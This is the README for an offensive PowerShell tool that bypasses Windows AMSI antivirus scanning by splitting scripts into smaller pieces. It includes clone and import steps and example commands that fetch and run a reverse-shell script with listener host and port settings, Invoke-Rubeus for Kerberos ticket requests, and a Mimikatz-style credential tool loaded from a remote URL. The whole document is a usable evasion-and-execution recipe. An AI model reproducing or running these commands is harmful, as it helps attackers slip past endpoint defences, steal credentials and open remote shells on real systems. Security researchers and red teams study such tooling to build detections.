# AMSI_Lines

*Bypass AMSI By Dividing files  into multiple smaller files*
Blog post: https://x4sh3s.github.io/posts/Divide-and-bypass-amsi/

### How To Use It

1. Clone The repository: `git clone https://github.com/x4sh3s/AMSI_Lines.git`
2. import the module
```powershell
PS C:\AMSI_Lines>import-module AMSI.ps1
```
3. execute the function `AMSI_Lines` : `AMSI_Lines -File "Url of the File" -Command "Command to be executed directly"`

### Examples:

```powershell
AMSI_Lines -File http://127.0.0.1:8080/revshell.ps1 -Commands "-LHOST MyIp -Port 9001"
AMSI_Lines # This Will Execute Invoke-Rubeus By default with '-h' parameter
AMSI_Lines -file "https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1" -Commands "invoke-rubeus asktgt"
AMSI_Lines -file "http://127.0.0.1:8001/Invoke-Ninikatz.ps1" -Commands "invoke-ninikatz -command coffee"
```
![image](https://user-images.githubusercontent.com/65988560/206858344-097a4dce-6e78-4749-b204-1ba9614ad9f2.png)
